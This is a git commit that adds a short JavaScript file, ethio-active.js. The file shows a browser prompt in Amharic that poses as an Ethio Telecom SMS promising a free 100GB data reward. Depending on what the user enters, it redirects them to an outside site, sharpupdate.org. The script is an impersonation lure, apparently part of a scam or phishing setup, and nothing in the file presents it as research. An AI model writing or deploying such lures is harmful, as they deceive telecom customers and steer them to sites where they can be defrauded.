18c0b379c7658799f122f8b1596918936f182f9d
ekperikpe <ekperikpe588@gmail.com>
2025-04-27 15:17:33 +0100

    Create ethio-active.js

---
+++ ethio-active.js
@@ -0,0 +1,5 @@
+var password = '100GB አግብር'
+password=prompt('SMS: እንኳን ደስ ያለህ የኢትዮ ቴሌኮም ሲም ካርድህ የነጻ ዳታ የቆየ የሲም ካርድ ሽልማት ለማግኘት ብቁ ነው አሁኑኑ ለማግበር እሺን ጠቅ አድርግ','100GB አግብር');
+if (password != '100GB አግብር') {
+location.href='https://sharpupdate.org/ethio-tele.html';
+}
